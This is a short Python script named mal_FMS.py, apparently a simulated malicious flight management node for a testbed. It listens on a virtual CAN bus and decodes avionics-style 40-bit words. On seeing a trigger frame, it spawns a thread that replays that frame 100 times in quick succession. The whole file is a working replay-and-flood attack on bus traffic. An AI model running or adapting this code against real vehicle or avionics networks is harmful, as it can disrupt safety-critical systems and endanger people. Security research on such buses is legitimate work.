# mal_FMS.py

import can
import time
import threading

ARBITRATION_ID = 0x100
REPLAY_COUNT = 100     # how many times to replay on trigger
REPLAY_DELAY = 0.01    # delay between replays (seconds)


def decode_40bit_from_bytes(data_bytes: bytes) -> dict:
    # decode
    if len(data_bytes) != 5:
        return None
    word_full = int.from_bytes(data_bytes, byteorder='big')
    parity = (word_full >> 39) & 0x1
    ssm = (word_full >> 37) & 0x3
    data = (word_full >> 18) & 0x7FFFF
    sdi = (word_full >> 16) & 0x3
    label = (word_full >> 8) & 0xFF
    auth = word_full & 0xFF
    return {
        "parity": parity,
        "ssm": ssm,
        "data": data,
        "sdi": sdi,
        "label": label,
        "auth": auth,
        "raw_int": word_full
    }


def replay_frame(bus, raw_bytes: bytes, count=REPLAY_COUNT, delay=REPLAY_DELAY):
    # does the replay flood
    msg = can.Message(arbitration_id=ARBITRATION_ID, data=raw_bytes, is_extended_id=False)
    for i in range(count):
        try:
            bus.send(msg)
        except can.CanError:
            print("[mal_FMS] CAN send failed")
        time.sleep(delay)
    print(f"[mal_FMS]: Replayed frame {count} times!")


def listener_loop(bus):
    # listens for the down label before it triggers replay
    while True:
        msg = bus.recv(timeout=1)
        if not msg:
            continue
        data_bytes = msg.data
        decoded = decode_40bit_from_bytes(data_bytes)
        if decoded is None:
            continue

        # Trigger the replay
        if decoded["label"] == 0x00 and decoded["data"] == 0:
            print("[mal_FMS]: Trigger detected. Replaying captured frame...")
            t = threading.Thread(target=replay_frame, args=(bus, data_bytes))
            t.start()


def main():
    bus = can.interface.Bus(channel='vcan0', interface='socketcan')
    listener_loop(bus)
    bus.shutdown()


if __name__ == "__main__":
    main()
